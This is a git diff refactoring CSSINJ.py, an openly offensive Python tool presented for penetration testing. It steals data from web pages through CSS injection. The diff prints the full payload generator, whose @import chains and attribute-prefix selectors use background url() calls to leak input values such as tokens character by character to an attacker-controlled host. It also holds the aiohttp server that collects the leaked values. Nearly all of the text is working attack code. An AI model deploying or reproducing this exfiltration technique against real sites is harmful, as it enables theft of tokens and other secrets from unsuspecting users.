@@ -1,72 +1,19 @@
-import argparse
 import string
-import datetime
 import random
-import urllib.parse
 from aiohttp import web
 import asyncio
+from cssinj import log
+from cssinj.injection import generate_injection
 
 
 class CssInjector:
     def __init__(self):
-        self.parser = self.set_parser()
         self.data = ""
         self.elements = []
         self.event = asyncio.Event()
         self.counter_req = 0
 
-    def log(self, status: str, message: str):
-        now = datetime.datetime.now()
-        if status == "server":
-            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🛠️ {message}")
-        elif status == "exfiltration":
-            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🔎 {message}")
-        elif status == "end_exfiltration":
-            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] ✅ {message}")
-        elif status == "connection":
-            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🌐 {message}")
-        elif status == "connection_details":
-            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] ⚙️ {message}")
-
-    def set_parser(self):
-        parser = argparse.ArgumentParser(
-            prog="CSSINJ.py",
-            description="A tool for exfiltrating sensitive information using CSS injection, designed for penetration testing and web application security assessment.",
-            epilog="A tool by \33[0;36mAsako\033[0m",
-        )
-        parser.add_argument(
-            "-H", "--hostname", required=True, help="Attacker hostname or IP address"
-        )
-        parser.add_argument(
-            "-p", "--port", required=True, type=int, help="Port number of attacker"
-        )
-        parser.add_argument(
-            "-i",
-            "--identifier",
-            required=False,
-            default="all",
-            help="CSS identifier to extract specific data",
-        )
-        parser.add_argument(
-            "-s",
-            "--selector",
-            help="Specify a CSS Attribute Selector for exfiltration",
-            default="value",
-            required=False,
-        )
-        parser.add_argument(
-            "-d",
-            "--details",
-            action="store_true",
-            help="Show detailed logs of the exfiltration process, including extracted data.",
-        )
-        return parser
-
-    def start(self):
-        print(
-            "\33[1m  _____   _____   _____  _____  _   _       _     _____  __     __\n / ____| / ____| / ____||_   _|| \\ | |     | |   |  __ \\ \\ \\   / /\n| |     | (___  | (___    | |  |  \\| |     | |   | |__) | \\ \\_/ /\n| |      \\___ \\  \\___ \\   | |  | . ` | _   | |   |  ___/   \\   /\n| |____  ____) | ____) | _| |_ | |\\  || |__| | _ | |        | |\n \\_____||_____/ |_____/ |_____||_| \\_| \\____/ (_)|_|        |_|\033[0m\n"
-        )
-        args = self.parser.parse_args()
+    def start(self, args):
         self.identifier = args.identifier
         self.hostname = args.hostname
         self.port = args.port
@@ -77,28 +24,16 @@ class CssInjector:
         web.run_app(
             self.app,
             port=self.port,
-            print=self.log(
+            print=log.message(
                 "server", f"Attacker's server started on {args.hostname}:{args.port}"
             ),
         )
 
-    def generate_injection(self):
-        self.counter_req += 1
-        stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
-        stri += f'html:has({self.identifier}[{self.selector}={repr(self.data)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/end?num={random.random()}") !important;}}'
-        stri += "".join(
-            map(
-                lambda x: f'html:has({self.identifier}[{self.selector}^={repr(self.data+x)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.data+x)}") !important;}}\n',
-                "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
-            )
-        )
-        return stri
-
     async def handle_start(self, request):
-        self.log("connection", f"Connection from {request.remote}")
+        log.message("connection", f"Connection from {request.remote}")
         if self.show_details:
             for key, value in request.headers.items():
-                self.log("connection_details", f"{key} : {value}")
+                log.message("connection_details", f"{key} : {value}")
         self.event.set()
         return web.Response(
             text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
@@ -106,7 +41,7 @@ class CssInjector:
         )
 
     async def handle_end(self, request):
-        self.log(
+        log.message(
             "end_exfiltration",
             f"The {self.selector} exfiltrated from {self.identifier} is : {self.data}",
         )
@@ -122,13 +57,25 @@ class CssInjector:
         if not self.event.is_set():
             await self.event.wait()
         self.event.clear()
-        return web.Response(text=self.generate_injection(), content_type="text/css")
+        self.counter_req += 1
+        return web.Response(
+            text=generate_injection(
+                hostname=self.hostname,
+                port=self.port,
+                data=self.data,
+                identifier=self.identifier,
+                selector=self.selector,
+                elements=self.elements,
+                counter_req=self.counter_req,
+            ),
+            content_type="text/css",
+        )
 
     async def handle_valid(self, request):
         self.event.set()
         self.data = request.query.get("token")
         if self.show_details:
-            self.log(
+            log.message(
                 "exfiltration",
                 f"Exfiltrating element {len(self.elements)} : {self.data}",
             )
